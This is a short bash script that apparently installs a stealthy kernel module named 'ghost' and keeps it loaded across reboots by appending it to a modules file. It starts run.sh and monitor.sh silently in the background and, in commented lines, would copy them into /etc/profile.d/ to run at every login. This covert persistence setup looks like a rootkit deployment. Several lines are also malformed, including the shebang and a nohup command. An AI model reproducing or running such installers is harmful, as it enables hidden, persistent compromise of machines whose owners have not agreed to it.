#/bin/bash

cd ghost
make all
insmod ghost.ko
echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
cd ..

# chmod +x dispose.sh
# ./dispose.sh
nohup ./run.sh & >/dev/null 2>&1 &
echo -e "\n\n"
chmod 764 monitor.sh
nohup monitor.sh >/dev/null 2>&1 &




# chmod +x run.sh
# chmod +x monitor.sh
# cp run.sh /etc/profile.d/
# cp monitor.sh /etc/profile.d/